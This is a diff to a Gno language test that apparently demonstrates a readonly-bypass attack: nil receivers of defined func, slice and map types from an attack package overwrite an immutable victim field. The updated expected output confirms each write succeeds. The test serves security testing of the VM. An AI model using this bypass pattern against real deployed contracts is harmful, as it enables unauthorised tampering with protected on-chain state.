@@ -5,12 +5,12 @@ package launderj
 //
 // Variants of Attack H/I where the receiver is a nil function-typed
 // value, nil slice, or nil map of a defined type. Each has
-// `GetFirstObject` returning nil — same anchor gap.
+// `GetFirstObject` returning nil — same Rule-2 anchor gap. Each
+// successive call overwrites imm.Field; the test asserts the final
+// value to confirm all three shapes write through.
 //
-// The Attack H/I fix's recvDeclaredTypePkgPath handles these
-// uniformly: the defined type's PkgPath is the anchor target
-// regardless of whether the underlying is primitive, pointer, func,
-// slice, or map.
+// Same preconditions as Attack H: exploitable only when victim
+// logic data is /p/-declared.
 
 import (
 	"gno.land/p/demo/tests/launderattack"
@@ -21,31 +21,20 @@ func main(cur realm) {
 	gp := laundervictim.GetPtr()
 	imm := laundervictim.GetImm()
 
-	// Each of these should fail at the readonly check.
+	var nilFn launderattack.EvilFunc
+	gp.UseMutator(imm, nilFn)
+	println("after EvilFunc:", laundervictim.ReadImm())
 
-	r1 := revive(func() {
-		var nilFn launderattack.EvilFunc
-		gp.UseMutator(imm, nilFn)
-	})
-	println("EvilFunc nil-recv blocked:", r1 != nil)
+	var nilSlice launderattack.EvilSlice
+	gp.UseMutator(imm, nilSlice)
+	println("after EvilSlice:", laundervictim.ReadImm())
 
-	r2 := revive(func() {
-		var nilSlice launderattack.EvilSlice
-		gp.UseMutator(imm, nilSlice)
-	})
-	println("EvilSlice nil-recv blocked:", r2 != nil)
-
-	r3 := revive(func() {
-		var nilMap launderattack.EvilMap
-		gp.UseMutator(imm, nilMap)
-	})
-	println("EvilMap nil-recv blocked:", r3 != nil)
-
-	println("imm.Field unchanged:", laundervictim.ReadImm())
+	var nilMap launderattack.EvilMap
+	gp.UseMutator(imm, nilMap)
+	println("after EvilMap:", laundervictim.ReadImm())
 }
 
 // Output:
-// EvilFunc nil-recv blocked: true
-// EvilSlice nil-recv blocked: true
-// EvilMap nil-recv blocked: true
-// imm.Field unchanged: original-imm
+// after EvilFunc: pwnd-via-func
+// after EvilSlice: pwnd-via-slice
+// after EvilMap: pwnd-via-map
